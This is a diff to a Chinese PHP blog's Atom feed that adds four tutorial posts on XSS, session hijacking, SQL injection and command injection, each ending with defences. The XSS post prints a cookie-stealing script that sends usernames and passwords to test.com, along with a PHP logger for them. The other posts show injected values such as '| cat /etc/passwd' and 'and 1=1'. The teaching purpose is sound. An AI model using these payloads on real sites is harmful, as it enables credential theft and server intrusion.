@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-21T16:59:00.749Z</updated>
+  <updated>2018-03-23T16:36:47.702Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,228 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>PHP|PHP漏洞全解-跨站脚本攻击XSS</title>
+    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
+    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-跨站脚本攻击XSS/</id>
+    <published>2018-03-24T00:29:09.000Z</published>
+    <updated>2018-03-23T16:36:47.702Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
+<h3 id="一个简单的留言板"><a href="#一个简单的留言板" class="headerlink" title="一个简单的留言板"></a>一个简单的留言板</h3><p>我们有个页面用于允许用户发表留言，然后在页面底部显示留言列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;?php include(&apos;/components/headerinclude.php&apos;);?&gt;&lt;/head&gt;</div><div class="line">    &lt;style type=&quot;text/css&quot;&gt;</div><div class="line">        .comment-title&#123;</div><div class="line">            font-size:14px;</div><div class="line">            margin: 6px 0px 2px 4px;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        .comment-body&#123;</div><div class="line">            font-size: 14px;</div><div class="line">            color:#ccc;</div><div class="line">            font-style: italic;</div><div class="line">            border-bottom: dashed 1px #ccc;</div><div class="line">            margin: 4px;</div><div class="line">        &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;/js/cookies.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form method=&quot;post&quot; action=&quot;list.php&quot;&gt;</div><div class="line">        &lt;div style=&quot;margin:20px;&quot;&gt;</div><div class="line">            &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Your Comment&lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Nick Name:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;input name=&quot;name&quot; type=&quot;text&quot; style=&quot;width:300px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Comment:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;textarea name=&quot;comment&quot; style=&quot;height:100px; width:300px;&quot;&gt;&lt;/textarea&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding-left:230px;&quot;&gt;</div><div class="line">                &lt;input type=&quot;submit&quot; value=&quot;POST&quot; style=&quot;padding:4px 0px; width:80px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;border-bottom:solid 1px #fff;margin-top:10px;&quot;&gt;</div><div class="line">                &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Comments&lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;?php </div><div class="line">                require(&apos;/components/comments.php&apos;); </div><div class="line">                if(!empty($_POST[&apos;name&apos;]))&#123;</div><div class="line">                    addElement($_POST[&apos;name&apos;],$_POST[&apos;comment&apos;]);</div><div class="line">                &#125;</div><div class="line">                renderComments();</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>addElement()方法用于添加新的留言，而renderComments()方法用于展留言列表，网页看起来是这样的</p>
+<p><img src="/images/PHP漏洞分析-跨站脚本XSS-01.png" alt="Wb" title="PHP漏洞分析-跨站脚本XSS-01"></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>因为我们完全信任了用户输入，但有些别有用心的用户会像这样的输入</p>
+<p><img src="/images/PHP漏洞分析-跨站脚本XSS-02.png" alt="用户输入" title="PHP漏洞分析-跨站脚本XSS-02"></p>
+<p>这样无论是谁访问这个页面的时候控制台都会输出“Hey you are a fool fish!”，如果这只是个恶意的小玩笑，有些人做的事情就不可爱了，有些用户会利用这个漏洞窃取用户信息、诱骗人打开恶意网站或者下载恶意程序等，看个最简单的例子</p>
+<h3 id="利用xss窃取用户名密码"><a href="#利用xss窃取用户名密码" class="headerlink" title="利用xss窃取用户名密码"></a>利用xss窃取用户名密码</h3><p>当然这个示例很简单，几乎攻击不到任何网站，仅仅看看其原理。我们知道很多登陆界面都有记住用户名、密码的功能方便用户下次登录，有些网站是直接用明文记录用户名、密码，恶意用户注册账户登录后使用简单工具查看cookie结构名称后，如果网站有xss漏洞，那么简单的利用jsonp就可以获取其它用户的用户名、密码了。</p>
+<p>恶意用户会这么输入</p>
+<p><img src="/images/PHP漏洞分析-跨站脚本XSS-03.png" alt="恶意输入" title="PHP漏洞分析-跨站脚本XSS-03"></p>
+<p>我们看看<a href="http://test.com/hack.js里藏了什么" target="_blank" rel="external">http://test.com/hack.js里藏了什么</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var username=CookieHelper.getCookie(&apos;username&apos;).value;</div><div class="line">var password=CookieHelper.getCookie(&apos;password&apos;).value;</div><div class="line">var script =document.createElement(&apos;script&apos;);</div><div class="line">script.src=&apos;http://test.com/index.php?username=&apos;+username+&apos;&amp;password=&apos;+password;</div><div class="line">document.body.appendChild(script);</div></pre></td></tr></table></figure></p>
+<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向<a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
+<p>发送了一个get请求</p>
+<p><a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    if(!empty($_GET[&apos;password&apos;]))&#123;</div><div class="line">        $username=$_GET[&apos;username&apos;];</div><div class="line">        $password=$_GET[&apos;password&apos;];</div><div class="line">        </div><div class="line">        try&#123;</div><div class="line">            $path=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/password.txt&apos;;</div><div class="line">            $fp=fopen($path,&apos;a&apos;);</div><div class="line">            flock($fp, LOCK_EX);</div><div class="line">            fwrite($fp, &quot;$username\t $password\r\n&quot;);</div><div class="line">            flock($fp, LOCK_UN);</div><div class="line">            fclose($fp);</div><div class="line">        &#125;catch(Exception $e)&#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这样恶意用户就把访问留言板的用户的信息窃取了</p>
+<h3 id="怎么预防"><a href="#怎么预防" class="headerlink" title="怎么预防"></a>怎么预防</h3><p>上面演示的是一个非常简单的XSS攻击，还有很多隐蔽的方式，但是其核心都是利用了脚本注入，因此我们解决办法其实很简单，不信赖用户输入，对特殊字符如”&lt;”,”&gt;”转义，就可以从根本上防止这一问题，当然很多解决方案都对XSS做了特定限制，如上面这中做法在ASP.NET中不幸不同，微软validateRequest对表单提交自动做了XSS验证。但防不胜防，总有些聪明的恶意用户会到我们的网站搞破坏，对自己站点不放心可以看看这个XSS跨站测试代码大全试试站点是否安全。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览
+    
+    </summary>
+    
+      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
+    
+    
+      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP|PHP漏洞全解-Session会话劫持</title>
+    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-Session%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/"/>
+    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-Session会话劫持/</id>
+    <published>2018-03-24T00:06:48.000Z</published>
+    <updated>2018-03-23T16:36:49.883Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户的session都是独立的，并且由服务器来维护。每个用户的session是由一个独特的字符串来识别，成为session id。用户发出请求时，所发送的http表头内包含session id 的值。服务器使用http表头内的session id来识别时哪个用户提交的请求。</p>
+<p>session保存的是每个用户的个人数据，一般的web应用程序会使用session来保存通过验证的用户账号和密码。在转换不同的网页时，如果需要验证用户身份，就是用session内所保存的账号和密码来比较。session的生命周期从用户连上服务器后开始，在用户关掉浏览器或是注销时用户session_destroy函数删除session数据时结束。如果用户在20分钟内没有使用计算机的动作，session也会自动结束。</p>
+<p>Session对于Web应用无疑是最重要的，也是最复杂的。对于web应用程序来说，加强安全性的第一条原则就是 – 不要信任来自客户端的数据，一定要进行数据验证以及过滤，才能在程序中使用，进而保存到数据层。 然而，为了维持来自同一个用户的不同请求之间的状态， 客户端必须要给服务器端发送一个唯一的身份标识符(Session ID)。 很显然，这和前面提到的安全原则是矛盾的，但是没有办法，http协议是无状态的，为了维持状态，我们别无选择。 可以看出，web应用程序中最脆弱的环节就是session，因为服务器端是通过来自客户端的一个身份标识来认证用户的， 所以session是web应用程序中最需要加强安全性的环节。　</p>
+<p>同时，基于session的攻击有很多种方式。大部分的手段都是首先通过捕获合法用户的session, 然后冒充该用户来访问系统。也就是说，攻击者至少必须要获取到一个有效的session标识符，用于接下来的身份验证。</p>
+<p>php处理session的应用架构:</p>
+<p><img src="/images/PHP漏洞分析-Session会话劫持-01.jpeg" alt="Session架构" title="PHP漏洞分析-Session会话劫持-01"></p>
+<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>会话劫持是指攻击者利用各种手段来获取目标用户的session id。一旦获取到session id，那么攻击者可以利用目标用户的身份来登录网站，获取目标用户的操作权限。</p>
+<p>攻击者获取目标用户session id的方法:</p>
+<p>1）暴力破解:尝试各种session id，直到破解为止。<br>2）计算:如果session id使用非随机的方式产生，那么就有可能计算出来<br>3）窃取:使用网络截获，xss攻击等方法获得</p>
+<p>对于PHP来说，其内部Session的实现机制虽然不是很安全，但是关于生成Session ID的环节还是比较安全的，这个随机的Session ID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。</p>
+<p>对于第三种方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。</p>
+<p>在应用层上也可以做出相应的防御措施：</p>
+<p>目前有三种广泛使用的在Web环境中维护会话（传递Session ID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。</p>
+<p>会话劫持的攻击步骤:</p>
+<p><img src="/images/PHP漏洞分析-Session会话劫持-02.jpeg" alt="劫持步骤" title="PHP漏洞分析-Session会话劫持-02"></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
+<li><p>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</p>
+</li>
+<li><p>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</p>
+</li>
+<li><p>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</p>
+</li>
+<li><p>关闭所有phpinfo类dump request信息的页面。</p>
+</li>
+<li><p>验证HTTP头部信息</p>
+</li>
+</ol>
+<p>在http访问头文件：[Accept-Charset、Accept-Encoding、Accept-Language、User-Agent]，浏览器一般发出的头部不会改</p>
+<p>使用User-Agent检测请求的一致性:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GET/HTTP/1.1</div><div class="line">host:example.org</div><div class="line">User-Agent:Firefox/1.0</div><div class="line">Accept:text/html,image/png,image/jpeg,image/gif,*/*</div><div class="line">Cookie:PHPSESSID=1234</div><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if(isset($_SESSION[&apos;HTTP_USER_AGENT&apos;]))&#123;    </div><div class="line">    if($_SESSION[&apos;HTTP_USER_AGENT&apos;]!=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]))&#123;</div><div class="line">                    /*Promptforpassword*/</div><div class="line">                   exit;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else&#123;      </div><div class="line">　　$_SESSION[&apos;HTTP_USER_AGENT&apos;]=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>确保User-Agent头部信息一致的确是有效的，如果会话标识通过cookie传递，攻击者能取得会话标识，他同时也能取得其它HTTP头部。由于cookie暴露与浏览器漏洞或跨站脚本漏洞相关，受害者需要访问攻击者的网站并暴露所有头部信息。则攻击者只需重建头部即可进行攻击了。</p>
+<ol>
+<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户
+    
+    </summary>
+    
+      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
+    
+    
+      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP|PHP漏洞全解-SQL注入攻击</title>
+    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
+    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-SQL注入攻击/</id>
+    <published>2018-03-23T23:43:54.000Z</published>
+    <updated>2018-03-23T16:36:54.017Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据。</p>
+<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>SQL注入攻击(SQL Injection)，是攻击者在表单中提交精心构造的sql语句，改动原来的sql语句，如果web程序没有对提交的数据经过检查，那么就会造成sql注入攻击。</p>
+<p>SQL注入攻击的一般步骤:</p>
+<ol>
+<li><p>攻击者访问有SQL注入漏洞的站点，寻找注入点</p>
+</li>
+<li><p>攻击者构造注入语句，注入语句和程序中的SQL语句结合生成新的sql语句</p>
+</li>
+<li><p>新的sql语句被提交到数据库中执行 处理</p>
+</li>
+<li><p>数据库执行了新的SQL语句，引发SQL注入攻击</p>
+</li>
+</ol>
+<p><img src="/images/PHP漏洞分析-SQL注入攻击-01.jpeg" alt="SQL注入攻击" title="PHP漏洞分析-SQL注入攻击-01"></p>
+<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>来个初学者刚学PHP时通常会写的SQL语句，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$query = &quot;select * from postmessage where id = &quot;.$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
+<p>如果用户的地址为 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 1=1 和 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 2=1,<br>参数id传递进来后，和前面的字符串结合的sql语句放入数据库执行 查询<br>提交 and 1=1，语句变成select <em> from postmessage where id = 71 and 1=1 这语句前值后值都为真，and以后也为真，返回查询到的数据<br>提交 and 1=2，语句变成select </em> from postmessage where id = 71 and 1=2 这语句前值为真，后值为假，and以后为假，查询不到任何数据<br>正常的SQL查询，经过我们构造的语句之后，形成了SQL注入攻击。通过这个注入点，我们还可以进一步拿到权限，比如说运用 union读取管理密码，读取数据库信息，或者用mysql的load_file，into outfile等函数进一步渗透。</p>
+<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><h4 id="整型参数"><a href="#整型参数" class="headerlink" title="整型参数:"></a>整型参数:</h4><p>运用 intval函数将数据转换成整数</p>
+<p>函数原型</p>
+<p>int intval(mixed var, int base)</p>
+<p>var是要转换成整形的变量</p>
+<p>base，可选，是基础数，默认是10</p>
+<h4 id="浮点型参数"><a href="#浮点型参数" class="headerlink" title="浮点型参数:"></a>浮点型参数:</h4><p>运用 floatval或doubleval函数分别转换单精度和双精度浮点型参数</p>
+<p>函数原型</p>
+<p>int floatval(mixed var)</p>
+<pre><code>var是要转换的变量
+</code></pre><p>int doubleval(mixed var)</p>
+<pre><code>var是要转换的变量
+</code></pre><h4 id="字符型参数"><a href="#字符型参数" class="headerlink" title="字符型参数:"></a>字符型参数:</h4><p>运用 addslashes函数来将单引号“’”转换成“\’”，双引号“””转换成“\””，反斜杠“\”转换成“\”，NULL字符加上反斜杠“\”</p>
+<p>函数原型</p>
+<p>string addslashes (string str)</p>
+<pre><code>str是要检查的字符串
+</code></pre><p>那么刚才出现的代码漏洞，我们可以这样修补<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// 执行mysql查询语句</div><div class="line"></div><div class="line">$query = &quot;select * from postmessage where id = &quot;.intval($_GET[&quot;id&quot;]);</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
+<p>如果是字符型，先判断magic_quotes_gpc能无法 为On,当不为On的时候运用 addslashes转义特殊字符。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(get_magic_quotes_gpc())&#123;  </div><div class="line">  　 $var = $_GET[&quot;var&quot;];  </div><div class="line">&#125;else&#123;  </div><div class="line">　   $var = addslashes($_GET[&quot;var&quot;]);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询
+    
+    </summary>
+    
+      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
+    
+    
+      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP|PHP漏洞全解-命令注入攻击</title>
+    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
+    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-命令注入攻击/</id>
+    <published>2018-03-23T22:58:53.000Z</published>
+    <updated>2018-03-23T16:36:56.560Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格域)来改变网页的动态生成的内容。使用系统命令是一项危险的操作，尤其在你试图使用远程数据来构造要执行的命令时更是如此。如果使用了被污染数据，命令注入漏洞就产生了。</p>
+<h3 id="命令注入攻击"><a href="#命令注入攻击" class="headerlink" title="命令注入攻击"></a>命令注入攻击</h3><p>PHP中可以使用下列5个函数来执行外部的应用程序或函数</p>
+<p>system、exec、passthru、shell_exec、“(与shell_exec功能相同)</p>
+<p>函数原型</p>
+<p><strong>string system(string command, int &amp;return_var)</strong></p>
+<ul>
+<li>command 要执行的命令</li>
+<li>return_var 存放执行命令的执行后的状态值</li>
+</ul>
+<p><strong>string exec (string command, array &amp;output, int &amp;return_var)</strong></p>
+<ul>
+<li>command 要执行的命令</li>
+<li>output 获得执行命令输出的每一行字符串</li>
+<li>return_var 存放执行命令后的状态值</li>
+</ul>
+<p><strong>void passthru (string command, int &amp;return_var)</strong></p>
+<ul>
+<li>command 要执行的命令</li>
+<li>return_var 存放执行命令后的状态值</li>
+<li>string shell_exec (string command)</li>
+<li>command 要执行的命令</li>
+</ul>
+<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$dir = $_GET[&quot;dir&quot;]; </div><div class="line">if (isset($dir))&#123; </div><div class="line">    echo &quot;&quot;; </div><div class="line">    system(&quot;ls -al &quot;.$dir); </div><div class="line">    echo &quot;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>我们提交<a href="http://www.sectop.com/ex1.php?dir=|" target="_blank" rel="external">http://www.sectop.com/ex1.php?dir=|</a> cat /etc/passwd</p>
+<p>提交以后，命令变成了 system(“ls -al | cat /etc/passwd”);</p>
+<p><img src="/images/PHP漏洞分析-命令注入攻击-01.jpeg" alt="漏洞分析" title="PHP漏洞分析-命令注入攻击-01"></p>
+<h3 id="eval注入攻击"><a href="#eval注入攻击" class="headerlink" title="eval注入攻击"></a>eval注入攻击</h3><p>eval函数将输入的字符串参数当作PHP程序代码来执行</p>
+<p>函数原型:</p>
+<p><strong>mixed eval(string code_str)</strong>         //eval注入一般发生在攻击者能控制输入的字符串的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$var = &quot;var&quot;; </div><div class="line">if (isset($_GET[&quot;arg&quot;])) &#123; </div><div class="line">    $arg = $_GET[&quot;arg&quot;]; </div><div class="line">    eval(&quot;\$var = $arg;&quot;); </div><div class="line">    echo &quot;\$var =&quot;.$var; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>当我们提交<a href="http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了" target="_blank" rel="external">http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了</a>.</p>
+<h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">func A() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line"></div><div class="line">func B() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line">if (isset($_GET[&quot;func&quot;])) </div><div class="line">&#123; </div><div class="line">    $myfunc = $_GET[&quot;func&quot;]; </div><div class="line">    echo $myfunc(); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序员原意是想动态调用A和B函数，那我们提交<a href="http://www.sectop.com/ex.php?func=phpinfo漏洞产生" target="_blank" rel="external">http://www.sectop.com/ex.php?func=phpinfo漏洞产生</a>.</p>
+<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><ol>
+<li><p>尽量不要执行外部命令</p>
+</li>
+<li><p>使用自定义函数或函数库来替代外部命令的功能</p>
+</li>
+<li><p>使用escapeshellarg函数来处理命令参数</p>
+</li>
+<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>
+</li>
+</ol>
+<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“””，替换成“\””，分号“;”替换成“\;”</p>
+<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">safe_mode = On</div><div class="line">safe_mode_exec_dir = /usr/local/php/bin/</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格
+    
+    </summary>
+    
+      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
+    
+    
+      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
     <title>PHP|图片验证码</title>
     <link href="http://yoursite.com/2018/03/22/PHP-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
     <id>http://yoursite.com/2018/03/22/PHP-图片验证码/</id>
     <published>2018-03-21T22:00:11.000Z</published>
-    <updated>2018-03-21T16:59:00.749Z</updated>
+    <updated>2018-03-23T16:36:59.191Z</updated>
     
